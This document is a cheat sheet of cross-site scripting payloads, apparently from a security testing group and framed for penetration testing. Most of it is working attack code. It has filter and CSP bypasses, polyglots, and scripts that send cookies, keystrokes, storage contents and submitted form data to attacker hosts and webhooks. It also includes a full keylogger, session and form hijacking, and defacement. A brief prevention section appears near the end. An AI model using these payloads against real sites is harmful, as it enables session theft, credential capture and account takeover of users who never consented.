# Resource Drop: Ultimate XSS Payload Collection (2024 Edition)

**Type:** Cheat Sheet / Reference  
**Skill Level:** All Levels  
**Last Updated:** March 2, 2024  
**Contains:** 50+ working payloads

---

## Quick Reference

### Basic Alert (For Testing)
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
```

### Grab Cookies (Proof of Impact)
```html
<script>fetch('https://your-server.com/?c='+document.cookie)</script>
<script>new Image().src='https://your-server.com/?c='+document.cookie</script>
```

### Account Takeover (Keylogger)
```html
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://your-server.com/?k='+e.key);
});
</script>
```

---

## By Context

### 1. HTML Context (Between Tags)

**Basic:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

**Advanced:**
```html
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<details open ontoggle=alert(1)>
```

### 2. Attribute Context (Inside HTML Attributes)

**href/src:**
```html
javascript:alert(1)
javascript:alert(1)//
javascript://%0aalert(1)
```

**onerror/onload:**
```html
' onerror=alert(1) '
" onerror=alert(1) "
` onerror=alert(1) `
```

**style:**
```html
expression(alert(1))
-moz-binding:url(//evil.com/xss.xml#xss)
```

### 3. JavaScript Context (Inside <script>)

**Breaking out of strings:**
```javascript
';alert(1);//
';alert(1);'
\';alert(1);\'
${alert(1)}
```

**Template literals:**
```javascript
${alert(1)}
${document.location='https://evil.com?c='+document.cookie}
```

### 4. URL Context (In URL Parameters)

**Basic:**
```
https://target.com/search?q=<script>alert(1)</script>
https://target.com/page#<img src=x onerror=alert(1)>
```

**Encoded:**
```
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;
\x3Cscript\x3Ealert(1)\x3C/script\x3E
```

---

## WAF Bypass Techniques

### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
```

### Encoding
```html
// HTML entities
&lt;script&gt;alert(1)&lt;/script&gt;

// Hex encoding
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E

// Unicode
\u003cscript\u003ealert(1)\u003c/script\u003e

// Base64 (use with atob)
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Alternative Tags
```html
// If <script> is blocked
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<audio src onerror=alert(1)>
<video src onerror=alert(1)>
```

### Event Handlers (No Script Tag)
```html
// Mouse events
onmouseover=alert(1)
onclick=alert(1)
onfocus=alert(1)
onblur=alert(1)

// Load events
onload=alert(1)
onerror=alert(1)
onpageshow=alert(1)

// Form events
oninput=alert(1)
onchange=alert(1)
onsubmit=alert(1)

// Special events
onhashchange=alert(1)
onmessage=alert(1)
onpopstate=alert(1)
```

### Polyglot Payloads (Work Everywhere)
```javascript
// Works in JS, HTML, and attributes
'/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//\x3e

// Universal
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//\x3e
```

---

## DOM-Based XSS

### Location Hash
```javascript
#<img src=x onerror=alert(1)>
#<script>alert(1)</script>
#javascript:alert(1)
```

### document.write
```javascript
// If input is written directly:
"><img src=x onerror=alert(1)>
```

### innerHTML
```javascript
// Trigger with:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### eval()
```javascript
// If user input goes to eval:
alert(1)
';alert(1);'
```

### jQuery
```javascript
// If using .html():
<img src=x onerror=alert(1)>

// If using .attr():
" onerror=alert(1) x="
```

---

## Blind XSS

### For XSS Hunter / Similar Platforms
```html
<script src=https://your-xss-hunter.xss.ht></script>

// Alternative
<script>
fetch('https://your-server.com/?cookie='+document.cookie+'&location='+location.href);
</script>
```

### Slack/Discord Webhook
```html
<script>
fetch('https://hooks.slack.com/services/YOUR/WEBHOOK/URL', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        text: 'XSS Fired! URL: '+location.href+' Cookie: '+document.cookie
    })
});
</script>
```

### Email Exfiltration
```html
<script>
window.location='mailto:attacker@example.com?subject=XSS&body='+document.cookie;
</script>
```

---

## CSP Bypasses

### If 'unsafe-inline' is Present
```html
<script nonce="known-nonce">alert(1)</script>
```

### If 'unsafe-eval' is Present
```html
<script>eval('alert(1)')</script>
```

### JSONP Endpoints
```html
<script src="https://target.com/api/jsonp?callback=alert(1)"></script>
```

### AngularJS (if loaded)
```html
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

### Old jQuery
```html
<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
<script>
$.getScript('data:text/javascript,alert(1)');
</script>
```

---

## Advanced Exploitation

### Keylogger (Full)
```html
<script>
var keys='';
document.onkeypress=function(e) {
    keys+=e.key;
    if(keys.length>10) {
        fetch('https://your-server.com/?k='+keys);
        keys='';
    }
};
</script>
```

### Session Hijacking
```html
<script>
fetch('https://your-server.com/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        cookie: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage,
        url: location.href
    })
});
</script>
```

### Form Hijacking
```html
<script>
document.forms[0].onsubmit=function(e) {
    e.preventDefault();
    fetch('https://your-server.com/steal', {
        method: 'POST',
        body: new FormData(this)
    });
    this.submit();
};
</script>
```

### Deface (Visual Proof)
```html
<script>
document.body.innerHTML='<h1>Hacked by XSS</h1>';
</script>
```

---

## Testing Methodology

### Step 1: Identify Input Points
```
URL parameters
Form fields
Headers (User-Agent, Referer)
File uploads (filename)
JSON/XML inputs
WebSocket messages
```

### Step 2: Test Basic Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
" onerror=alert(1) x="
```

### Step 3: Check Context
```
- Is it reflected immediately?
- Is it stored?
- Is it DOM-based?
- Any encoding/filtering?
```

### Step 4: Bypass Filters
```
- Try different tags
- Try different events
- Try encoding
- Try case variation
- Try nested tags
```

### Step 5: Escalate Impact
```
- Grab cookies
- Keylogger
- Session hijacking
- CSRF token theft
- Internal network scanning
```

---

## Tools for XSS Testing

### Browser Extensions
- **XSS Hunter** - Blind XSS detection
- **HackBar** - Quick payload testing
- **Tamper Data** - Request modification

### Online Tools
- **XSStrike** - Advanced XSS detection
  ```bash
  python3 xsstrike.py -u "https://target.com/search?q=test"
  ```

- **DalFox** - Modern XSS scanner
  ```bash
  dalfox url https://target.com/search?q=test
  ```

- **XSSer** - Automated XSS testing
  ```bash
  xsser -u "https://target.com/search?q=XSS"
  ```

---

## Prevention (For Developers)

### Input Validation
```javascript
// Whitelist approach
const allowed = /^[a-zA-Z0-9]+$/;
if (!allowed.test(userInput)) {
    reject();
}
```

### Output Encoding
```javascript
// Context-aware encoding
function htmlEncode(str) {
    return str.replace(/[&<>"']/g, function(m) {
        return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;','\'':'&#39;'}[m];
    });
}
```

### Content Security Policy
```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self';
    style-src 'self';
    img-src 'self' data:;
    connect-src 'self';
    font-src 'self';
    object-src 'none';
    media-src 'self';
    frame-src 'none';
```

---

## Pro Tips

💡 **Tip #1: Always Test '>' and '<' First**
```
If < > are encoded, likely proper HTML encoding in place
If they pass through, potential XSS vector
```

💡 **Tip #2: Check for Double Encoding**
```
%253C = URL-encoded %3C
May bypass single-layer filters
```

💡 **Tip #3: Use Unique Identifiers**
```html
<script>alert('cipherops-xss-'+Math.random())</script>
```

💡 **Tip #4: Try Different Browsers**
```
Chrome - Most restrictive CSP
Firefox - Different parser behavior
Safari - Unique quirks
```

💡 **Tip #5: Document Your Findings**
```
- Screenshot of alert()
- HTTP request showing payload
- HTTP response showing execution
- Impact demonstration
```

---

## Download This Collection

**JSON Format:**
```json
{
  "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
  "advanced": ["<svg onload=alert(1)>", "<iframe src=javascript:alert(1)>"],
  "waf_bypass": ["<ScRiPt>alert(1)</ScRiPt>", "%3Cscript%3Ealert(1)%3C/script%3E"],
  "blind": ["<script src=https://your-server.com/xss.js></script>"]
}
```

**Text File:**
```bash
# Download all payloads
curl -O https://cipherops.gitbook.io/payloads/xss-payloads.txt
```

---

## Related Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Hunter](https://xsshunter.com/)
- [HTML5 Security Cheatsheet](https://html5sec.org/)

---

*Published: March 2, 2024*  
*Last Updated: March 2, 2024*  
*Total Payloads: 50+*  
*Author: CipherOps Team*

---

**Found this useful?** Bookmark it!  
**Want more?** Check out our SQL Injection payload collection [here](link)
